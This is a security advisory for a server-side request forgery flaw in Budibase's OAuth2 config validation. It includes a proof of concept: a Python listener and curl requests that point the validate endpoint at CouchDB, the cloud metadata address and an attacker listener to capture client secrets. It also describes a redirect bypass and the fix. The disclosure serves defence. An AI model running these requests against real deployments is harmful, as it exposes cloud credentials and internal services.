# [H] Budibase: SSRF via OAuth2 Config Validation — Missing fetchWithBlacklist Protection

## Summary
Severity: High
Advisory: GHSA-g6qx-g4pr-92v7
CVE: CVE-2026-48146
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-g6qx-g4pr-92v7
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.39.0

## Details
### Summary

The OAuth2 token fetch function in `packages/server/src/sdk/workspace/oauth2/utils.ts` (line 59) uses raw `fetch(config.url)` with **no SSRF protection**. The safe wrapper `fetchWithBlacklist()` exists in the same codebase and is used in every other outbound HTTP call (automation steps, plugin downloads, object store), but was **not applied** to the OAuth2 token endpoint.

A user with BUILDER role can point the OAuth2 token URL to internal services (CouchDB, cloud metadata) to exfiltrate sensitive data.

### Details

**Vulnerable code — `packages/server/src/sdk/workspace/oauth2/utils.ts:59`:**

```typescript
async function fetchToken(config: OAuth2Config): Promise<TokenResponse> {
  // ...
  const response = await fetch(config.url, fetchConfig)  // NO blacklist check!
  // ...
}
```

**Safe wrapper used everywhere else — `packages/backend-core/src/utils/outboundFetch.ts`:**

```typescript
export async function fetchWithBlacklist(url: string, opts?: RequestInit) {
  await blacklist.isBlacklisted(url)  // Checks against internal IPs
  const response = await fetch(url, { ...opts, redirect: "manual" })
  // Re-checks every redirect target
}
```

**Where `fetchWithBlacklist` IS used (consistency gap proof):**
- `automations/steps/discord.ts` — Discord webhook
- `automations/steps/slack.ts` — Slack webhook
- `automations/steps/make.ts` — Make.com integration
- `automations/steps/n8n.ts` — n8n integration
- `automations/steps/zapier.ts` — Zapier integration
- `automations/steps/outgoingWebhook.ts` — Custom webhooks
- Plugin download (GitHub, NPM)
- Object store tarball downloads

**Where it is NOT used:**
- `sdk/workspace/oauth2/utils.ts:59` — OAuth2 token fetch ← **THIS VULNERABILITY**

### PoC

```bash
# 1. Start SSRF listener
python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print(f'SSRF: {self.path} | Body: {body.decode()}')
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{\"access_token\":\"x\",\"token_type\":\"bearer\"}')
http.server.HTTPServer(('0.0.0.0', 9999), H).serve_forever()
" &

# 2. As builder, validate OAuth2 config pointing to internal service
curl -b cookies.txt -X POST http://budibase:10000/api/oauth2/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:9999/ssrf","clientId":"test","clientSecret":"test"}'

# Result: Listener captures POST with Authorization: Basic header containing credentials
# The client_id and client_secret are leaked to the attacker-controlled URL

# 3. Access internal CouchDB
curl -b cookies.txt -X POST http://budibase:10000/api/oauth2/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5984/_all_dbs","clientId":"x","clientSecret":"x"}'

# Result: {"valid":false,"message":"Unauthorized"} — confirms CouchDB is reachable

# 4. Access AWS metadata (in cloud deployments)
curl -b cookies.txt -X POST http://budibase:10000/api/oauth2/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","clientId":"x","clientSecret":"x"}'
```

### Additional SSRF Vector: REST Integration Redirect Bypass

The REST integration at `packages/server/src/integrations/rest.ts:754-778` calls `blacklist.isBlacklisted(url)` only once on the initial URL, then passes it to `undici.fetch()` with default `redirect: "follow"`. Redirect targets are NOT re-checked against the blacklist. An attacker can use an external URL that 302-redirects to `169.254.169.254`.

**Contrast with safe wrapper:** `fetchWithBlacklist()` uses `redirect: "manual"` and re-checks every redirect target.

### Impact

- **Internal service access** — CouchDB (default port 5984), Redis, internal APIs
- **Cloud metadata exfiltration** — AWS/GCP/Azure IAM credentials via 169.254.169.254
- **Credential leakage** — OAuth2 client_id and client_secret sent as Basic auth to attacker URL
- **Network reconnaissance** — Scan internal ports by observing error differences (ECONNREFUSED vs timeout vs response)

### Remediation

Replace `fetch(config.url, fetchConfig)` with `fetchWithBlacklist(config.url, fetchConfig)` in `packages/server/src/sdk/workspace/oauth2/utils.ts`:

```typescript
import { fetchWithBlacklist } from "@budibase/backend-core/utils"

async function fetchToken(config: OAuth2Config): Promise<TokenResponse> {
  // ...
  const response = await fetchWithBlacklist(config.url, fetchConfig)
  // ...
}
```

Also fix the REST integration redirect bypass in `packages/server/src/integrations/rest.ts` by using `fetchWithBlacklist()` instead of raw `undici.fetch()`.

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-g6qx-g4pr-92v7
- https://nvd.nist.gov/vuln/detail/CVE-2026-48146
- https://github.com/Budibase/budibase
